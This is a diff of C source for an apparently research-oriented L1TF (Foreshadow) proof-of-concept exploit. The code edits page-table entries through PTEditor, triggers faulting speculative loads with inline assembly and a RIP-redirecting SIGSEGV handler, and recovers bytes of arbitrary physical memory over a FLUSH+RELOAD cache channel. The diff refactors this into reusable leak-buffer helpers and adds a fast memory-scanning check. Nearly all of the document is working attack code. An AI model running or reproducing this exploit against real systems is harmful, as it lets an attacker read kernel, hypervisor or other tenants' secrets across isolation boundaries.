@@ -1,11 +1,11 @@
 #define _GNU_SOURCE
-#include "asm.h"
+#include "l1tf.h"
 #include "constants.h"
 #include "flush_and_reload.h"
 #include "statistics.h"
 #include <bits/types/siginfo_t.h>
-#include <ctype.h>
 #include <signal.h>
+#include <stdbool.h>
 #include <stdint.h>
 #include <stdlib.h>
 #include <string.h>
@@ -20,69 +20,24 @@
 
 #include <assert.h>
 
-extern uint64_t reload_label(void);
-
 #define THRESHOLD 150
 
 #pragma GCC diagnostic push
 #pragma GCC diagnostic ignored "-Wunused-parameter"
-static void segfault_handler(int sig, siginfo_t *info, void *ucontext) {
+static void segfault_handler_nibbles(int sig, siginfo_t *info, void *ucontext) {
   ucontext_t *uc = (ucontext_t *)ucontext;
   greg_t *rip = &uc->uc_mcontext.gregs[REG_RIP];
-  *rip = (uint64_t)&reload_label;
+  *rip = (uint64_t)&reload_label_nibbles;
+}
+
+static void segfault_handler_full(int sig, siginfo_t *info, void *ucontext) {
+  ucontext_t *uc = (ucontext_t *)ucontext;
+  greg_t *rip = &uc->uc_mcontext.gregs[REG_RIP];
+  *rip = (uint64_t)&reload_label_full;
 }
 #pragma GCC diagnostic pop
 
-// The reload buffer will be used to leak 8 bytes at a time.
-// Instead of leaking byte-for-byte, and thus needing a covert
-// channel "resolution" of 2^8 = 256 pages per byte we want to leak,
-// we can leak nibble-for-nibble. This requires just 2^4 = 16 pages
-// per nibble, giving us the ability to leak 256/16 = 16 nibbles = 8 bytes
-// per FLUSH+RELOAD iteration.
-// The tradeoff is that we require a larger speculative window, and need
-// some additional post processing to reconstruct the data.
-#define AMOUNT_OF_OPTIONS_IN_NIBBLE 16
-#define AMOUNT_OF_NIBBLES_PER_RELOAD 2
-#define AMOUNT_OF_RELOAD_PAGES                                                 \
-  (AMOUNT_OF_OPTIONS_IN_NIBBLE * AMOUNT_OF_NIBBLES_PER_RELOAD)
-typedef uint8_t reload_buffer_t[AMOUNT_OF_NIBBLES_PER_RELOAD]
-                               [AMOUNT_OF_OPTIONS_IN_NIBBLE][PAGE_SIZE];
-
-uint8_t l1tf(void *leak_addr, reload_buffer_t reload_buffer) {
-  size_t raw_results[AMOUNT_OF_RELOAD_PAGES] = {0};
-
-  flush(AMOUNT_OF_RELOAD_PAGES, PAGE_SIZE, (void *)reload_buffer);
-
-  // Flush the address of the segfault handler to increase
-  // the length of the speculative window (hopefully?)
-  clflush((void *)segfault_handler);
-  mfence();
-
-  asm volatile("xor %%rax, %%rax\n"
-               "xor %%rbx, %%rbx\n"
-               "movq (%[leak_addr]), %%rax\n"
-               "movq %%rax, %%rbx\n"
-               "and $0xf0, %%rax\n"
-               "and $0x0f, %%rbx\n"
-               "shl $0x8, %%rax\n"
-               "shl $0xc, %%rbx\n"
-               "prefetcht0 (%[nibble0], %%rbx)\n"
-               "prefetcht0 (%[nibble1], %%rax)\n"
-               "mfence\n"
-               "loop:\n"
-               "pause\n"
-               "jmp loop\n"
-               ".global reload_label\n"
-               "reload_label:"
-
-               ::[leak_addr] "r"(leak_addr),
-               [nibble0] "r"(reload_buffer[0]), [nibble1] "r"(reload_buffer[1])
-               : "rax", "rbx");
-
-  reload(AMOUNT_OF_RELOAD_PAGES, PAGE_SIZE, (void *)reload_buffer, raw_results,
-         THRESHOLD);
-
-  // Reconstruct
+uint8_t reconstruct_nibbles(size_t raw_results[AMOUNT_OF_RELOAD_PAGES]) {
   uint8_t result = 0;
   for (size_t nibble = 0; nibble < AMOUNT_OF_NIBBLES_PER_RELOAD; ++nibble) {
     size_t *partial_results =
@@ -90,20 +45,89 @@ uint8_t l1tf(void *leak_addr, reload_buffer_t reload_buffer) {
     size_t max = maximum(AMOUNT_OF_OPTIONS_IN_NIBBLE, partial_results);
     result |= max << (4 * nibble);
   }
-
   return result;
 }
 
-void leak_page(size_t pfn, void *leak, reload_buffer_t reload_buffer,
-               size_t amount_to_leak, uint8_t data_out[amount_to_leak]) {
-  // Set the PFN of the leak page
-  ptedit_pte_set_pfn(leak, 0, pfn);
+uint8_t l1tf_full(void *leak_addr, reload_buffer_t reload_buffer) {
+  size_t raw_results[AMOUNT_OF_RELOAD_PAGES] = {0};
 
-  for (size_t j = 0; j < amount_to_leak; j += 1) {
-    void *leak_addr = (char *)leak + j;
-    uint8_t leaked_byte = l1tf(leak_addr, reload_buffer);
-    data_out[j] = leaked_byte;
+  flush(AMOUNT_OF_RELOAD_PAGES, PAGE_SIZE, (void *)reload_buffer);
+
+  // Flush the address of the segfault handler to increase
+  // the length of the speculative window (hopefully?)
+  clflush((void *)segfault_handler_nibbles);
+  mfence();
+
+  asm_l1tf_leak_nibbles(leak_addr, reload_buffer);
+
+  reload(AMOUNT_OF_RELOAD_PAGES, PAGE_SIZE, (void *)reload_buffer, raw_results,
+         THRESHOLD);
+
+  return reconstruct_nibbles(raw_results);
+}
+
+// Super fast checking of the existance of a byte at a certain address.
+// Only requires a single FLUSH+RELOAD of a single address (instead
+// of 32 or 256). Useful to quickly scan physical memory, assuming we know
+// that a certain byte appears.
+bool l1tf_check(void *leak_addr, full_reload_buffer_t reload_buffer,
+                uint8_t check) {
+  clflush(reload_buffer[check]);
+  clflush((void *)segfault_handler_full);
+  mfence();
+
+  asm_l1tf_leak_full(leak_addr, reload_buffer);
+
+  size_t time = access_time(reload_buffer[check]);
+  return time < THRESHOLD;
+}
+
+// uintptr_t l1tf_scan_physical_memory(size_t length, uint8_t needle[length]) {}
+//
+// void leak_page(size_t pfn, void *leak, reload_buffer_t reload_buffer,
+//                size_t amount_to_leak, uint8_t data_out[amount_to_leak]) {
+//   // Set the PFN of the leak page
+//   ptedit_pte_set_pfn(leak, 0, pfn);
+//
+//   for (size_t j = 0; j < amount_to_leak; j += 1) {
+//     void *leak_addr = (char *)leak + j;
+//     uint8_t leaked_byte = l1tf_full(leak_addr, reload_buffer);
+//     data_out[j] = leaked_byte;
+//   }
+// }
+
+leak_addr_t l1tf_leak_buffer_create() {
+  void *leak_ptr = mmap(NULL, PAGE_SIZE, PROT_WRITE | PROT_READ,
+                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
+  assert(leak_ptr != MAP_FAILED);
+  assert(!mprotect(leak_ptr, PAGE_SIZE, PROT_NONE));
+
+  leak_addr_t leak;
+  leak.leak = leak_ptr;
+  leak.original_pfn = ptedit_pte_get_pfn(leak.leak, 0);
+  leak.current_pfn = leak.original_pfn;
+
+  ptedit_pte_clear_bit(leak.leak, 0, PTEDIT_PAGE_BIT_PRESENT);
+  return leak;
+}
+
+void l1tf_leak_buffer_modify(leak_addr_t *leak, uintptr_t ptr) {
+  size_t pfn = (ptr & ~(0xfff)) >> 0xc;
+
+  // This leak addr is already point to the corrent page frame
+  // number, so there is no need to modify the page table.
+  fprintf(stderr, "PFN: %lx\n", pfn);
+  if (leak->current_pfn == pfn) {
+    return;
   }
+  leak->current_pfn = pfn;
+  ptedit_pte_set_pfn(leak->leak, 0, pfn);
+}
+
+void l1tf_leak_buffer_free(leak_addr_t *leak) {
+  // Restore leak PFN before munmapping the buffer
+  ptedit_pte_set_pfn(leak->leak, 0, leak->original_pfn);
+  assert(!munmap(leak->leak, PAGE_SIZE));
 }
 
 int main(int argc, char *argv[argc]) {
@@ -123,37 +147,27 @@ int main(int argc, char *argv[argc]) {
   char *tail = NULL;
   uintptr_t phys_addr = strtoull(argv[1], &tail, 16);
   assert(tail != argv[1]);
-  size_t pfn = (phys_addr & ~(0xfff)) >> 0xc;
 
   tail = NULL;
   size_t length = strtoull(argv[2], &tail, 10);
   assert(tail != argv[2]);
-  assert((phys_addr & 0xfff) + length < PAGE_SIZE);
 
   fprintf(stderr, "Attempting to leak %ld bytes from %p...\n", length,
           (void *)phys_addr);
 
   fprintf(stderr, "Request leak and reload buffers\n");
-  void *leak = mmap(NULL, PAGE_SIZE, PROT_WRITE | PROT_READ,
-                    MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
-  fprintf(stderr, "Leak addr is %p\n", leak);
-  assert(leak != MAP_FAILED);
 
   reload_buffer_t *reload_buffer =
       mmap(NULL, sizeof(reload_buffer_t), PROT_WRITE | PROT_READ,
            MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
   assert(reload_buffer != MAP_FAILED);
 
-  // Modify the PFN
-  fprintf(stderr, "Set leak PFN to requested 0x%lx\n", pfn);
   assert(!ptedit_init());
-  assert(!mprotect(leak, PAGE_SIZE, PROT_NONE));
-  size_t leak_original_pfn = ptedit_pte_get_pfn(leak, 0);
-  ptedit_pte_clear_bit(leak, 0, PTEDIT_PAGE_BIT_PRESENT);
-  ptedit_pte_set_pfn(leak, 0, pfn);
+  leak_addr_t leak = l1tf_leak_buffer_create();
+  l1tf_leak_buffer_modify(&leak, phys_addr);
 
   struct sigaction sa = {0};
-  sa.sa_handler = (void *)segfault_handler;
+  sa.sa_handler = (void *)segfault_handler_nibbles;
   sigaction(SIGSEGV, &sa, NULL);
 
   fprintf(stderr, "Clear the reload buffer at %p\n", reload_buffer);
@@ -167,8 +181,10 @@ int main(int argc, char *argv[argc]) {
   size_t start = (phys_addr & 0xfff);
   while (1) {
     for (size_t j = start; j < start + length; j += 1) {
-      void *leak_addr = (char *)leak + j;
-      uint8_t leaked_byte = l1tf(leak_addr, *reload_buffer);
+      void *leak_addr = (char *)leak.leak + j;
+      // printf("%lx\n", leak_addr);
+      // l1tf_leak_buffer_modify(&leak, (uintptr_t)leak_addr);
+      uint8_t leaked_byte = l1tf_full(leak_addr, *reload_buffer);
 
       if (leaked_byte != 0) {
         results[j - start] = leaked_byte;
@@ -189,9 +205,8 @@ int main(int argc, char *argv[argc]) {
 
   free(results);
 
-  // Restore leak PFN before munmapping the buffer
-  ptedit_pte_set_pfn(leak, 0, leak_original_pfn);
-  assert(!munmap(leak, PAGE_SIZE));
+  l1tf_leak_buffer_free(&leak);
+
   assert(!munmap(reload_buffer, sizeof(reload_buffer_t)));
   ptedit_cleanup();
 }
